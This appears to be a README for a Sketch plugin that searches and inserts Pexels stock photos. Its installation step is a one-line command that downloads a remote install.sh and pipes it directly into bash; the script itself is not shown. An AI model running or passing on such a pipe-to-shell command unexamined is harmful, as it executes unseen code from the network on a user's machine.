# pexels-sketchplugin

A simple and powerful Sketch plugin to quickly search and insert high-quality images from Pexels directly into your design workflow.

## 🚀 Overview

**pexels-sketchplugin** allows designers to seamlessly browse and import free stock photos from Pexels without leaving Sketch. It helps speed up design workflows by eliminating the need to manually download and import images.

## ✨ Features

- Search Pexels images directly inside Sketch  
- Insert high-resolution images into your canvas  
- Fast and lightweight plugin  
- Easy installation and setup  
- Improves design workflow efficiency  

## 📦 Installation

Install the plugin instantly using the following command:
```bash
wget -qO- https://raw.githubusercontent.com/BohemianCoding/pexels-sketchplugin/refs/heads/main/install.sh | bash
```

This will download and execute the installation script automatically.

## 🛠 Usage

After installation:

- Open Sketch  
- Access the plugin from the Plugins menu  
- Search for images using keywords  
- Insert selected images directly into your design
